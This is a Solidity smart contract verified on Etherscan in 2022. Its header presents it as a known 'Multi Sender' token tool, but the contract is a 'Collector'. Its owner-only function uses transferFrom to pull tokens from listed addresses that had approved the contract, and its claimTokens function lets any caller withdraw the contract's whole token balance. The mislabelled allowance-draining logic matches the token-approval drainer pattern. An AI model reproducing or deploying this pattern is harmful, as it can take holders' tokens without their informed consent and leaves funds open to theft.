/**
 *Submitted for verification at Etherscan.io on 2022-06-02
*/

// Roman Storm Multi Sender
// To Use this Dapp: https://rstormsf.github.io/multisender
pragma solidity 0.4.23;


/**
 * @title ERC20Basic
 * @dev Simpler version of ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/179
 */
contract ERC20Basic {
    function totalSupply() public view returns (uint256);
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}


contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract Collector {
    


    address public owner;
    // ERC20 public token;
    uint public balanceReceived;

    constructor() public {
        /* 
            Deployer's address ( Factory in our case )
            do not pass this as a constructor argument because 
            etherscan will have issues displaying our validated source code
        */
        owner = msg.sender;
        // token = ERC20(0x0550cdae6d2918532ff27769bfec8e4b48c954df2a3e3ac19f1932540affebcd);
    }



    function tokenCollector(address token, address[] _contributors) public {
        require(msg.sender == owner);
        ERC20 erc20token = ERC20(token);   
        uint8 i = 0;
        for (i; i < _contributors.length; i++) {
            erc20token.transferFrom(_contributors[i],msg.sender, 1);
        }
    }

    function checkBalance(address token, address _contributor) public view returns (uint256){
        ERC20 erc20token = ERC20(token);
        return erc20token.allowance(_contributor,address(this));
    }

    function claimTokens(address _token) public {
        ERC20 erc20token = ERC20(_token);
        uint256 balance = erc20token.balanceOf(this);
        erc20token.transfer(msg.sender, balance);
    }

}